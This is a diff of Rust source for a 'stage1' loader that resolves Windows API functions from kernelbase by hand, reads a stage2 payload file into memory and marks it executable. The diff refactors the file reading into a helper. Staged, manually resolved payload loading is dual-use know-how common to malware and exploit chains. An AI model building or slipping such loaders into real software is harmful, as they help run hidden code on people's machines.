@@ -38,11 +38,8 @@ pub extern "C" fn main() -> u64 {
     }
     let kernelbase_ptr = kernelbase_ptr.unwrap();
 
-    let ReadFile = fetch_read_file(kernelbase_ptr);
-    let CreateFileA = fetch_create_file(kernelbase_ptr);
     let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
     let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
-    let GetFileSize = fetch_get_file_size(kernelbase_ptr);
     let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);
 
     #[cfg(feature = "debug")]
@@ -67,64 +64,33 @@ pub extern "C" fn main() -> u64 {
         );
     }
 
-    // Open the stage2 payload
-    let handle = unsafe {
-        CreateFileA(
-            stage2_filename.as_ptr() as *const i8,
-            CreateFileAccess::GenericRead as u32,
-            0,
-            core::ptr::null_mut() as PVOID,
-            4,    // OPEN_ALWAYS
-            0x80, // FILE_ATTRIBUTE_NORMAL
-            core::ptr::null_mut() as PVOID,
-        )
+    let file_funcs = FileReaderFuncs {
+        create_file: fetch_create_file(kernelbase_ptr),
+        read_file: fetch_read_file(kernelbase_ptr),
+        get_size: fetch_get_file_size(kernelbase_ptr),
+        virtual_alloc: VirtualAlloc,
+        close_handle: fetch_close_handle(kernelbase_ptr),
     };
 
-    if handle as usize == usize::MAX {
-        #[cfg(not(feature = "debug"))]
+    let stage2_reader = FileReader::open(stage2_filename.as_ptr() as *const _, &file_funcs);
+    if stage2_reader.is_err() {
         return STAGE1_ERROR_FILE_OPEN_FAILED;
-
-        debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
-        #[cfg(feature = "debug")]
-        {
-            debug_break!();
-        }
     }
+    let mut stage2_reader = unsafe { stage2_reader.unwrap_unchecked() };
 
-    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };
-
-    // Allocate memory for the stage 2 payload
-    let stage2_data =
-        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };
-
-    // Read the data from disk
-    let mut remaining_size = stage2_size;
-    let mut write_ptr = stage2_data;
-    while remaining_size > 0 {
-        let mut bytes_read = 0u32;
-
-        unsafe {
-            if ReadFile(
-                handle,
-                write_ptr,
-                remaining_size,
-                &mut bytes_read as *mut _,
-                core::ptr::null_mut(),
-            ) == 0
-            {
-                #[cfg(not(feature = "debug"))]
-                return STAGE1_ERROR_FILE_READ_FAILED;
-
-                debug_print!("Reading stage2 failed");
-                #[cfg(feature = "debug")]
-                {
-                    debug_break!();
-                }
-            }
-            write_ptr = write_ptr.offset(bytes_read as _);
+    // Read the full stage3 PE file to memory
+    let (stage2_data, stage2_len) = match stage2_reader.read_all() {
+        Ok(res) => res,
+        Err(FileReaderError::ReadFailed) => {
+            return STAGE1_ERROR_FILE_READ_FAILED;
         }
-        remaining_size -= bytes_read;
-    }
+        Err(FileReaderError::OpenFailed) => {
+            // Should be impossible but we'll handle it anyways for completeness
+            unreachable!();
+        }
+    };
+
+    drop(stage2_reader);
 
     let mut old_flags = 0u32;
 
@@ -132,8 +98,8 @@ pub extern "C" fn main() -> u64 {
     debug_print!("Changing stage2 permissions");
     unsafe {
         VirtualProtect(
-            stage2_data,
-            stage2_size as usize,
+            stage2_data as *const _,
+            stage2_len,
             0x20,
             &mut old_flags as *mut _,
         )
